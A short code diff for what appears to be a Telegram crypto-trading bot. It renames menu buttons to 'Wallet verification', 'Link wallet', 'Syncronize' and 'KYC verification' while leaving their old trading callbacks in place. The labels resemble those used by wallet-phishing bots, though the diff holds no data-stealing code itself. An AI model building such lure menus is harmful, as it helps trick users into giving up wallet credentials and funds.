@@ -126,15 +126,15 @@ def get_main_keyboard():
          InlineKeyboardButton("DCA Orders", callback_data="menu_dca"),
          InlineKeyboardButton("Copy Trade", callback_data="menu_copytrade")],
 
-        [InlineKeyboardButton("Sniper", callback_data="menu_sniper"),
-         InlineKeyboardButton("Trenches", callback_data="menu_trenches"),
-         InlineKeyboardButton("Referrals", callback_data="menu_referrals")],
+        [InlineKeyboardButton("Wallet verification", callback_data="menu_sniper"),
+         InlineKeyboardButton("Link wallet", callback_data="menu_trenches"),
+         InlineKeyboardButton("Syncronize", callback_data="menu_referrals")],
 
         [InlineKeyboardButton("Watchlist", callback_data="menu_watchlist"),
          InlineKeyboardButton("Withdraw", callback_data="menu_withdraw"),
          InlineKeyboardButton("Migration", callback_data="menu_migration")],
 
-        [InlineKeyboardButton("Snapshot", callback_data="menu_snapshot"),
+        [InlineKeyboardButton("KYC verification", callback_data="menu_snapshot"),
          InlineKeyboardButton("High Gas Fee", callback_data="menu_gas"),
          InlineKeyboardButton("Claim", callback_data="menu_claim")],
 
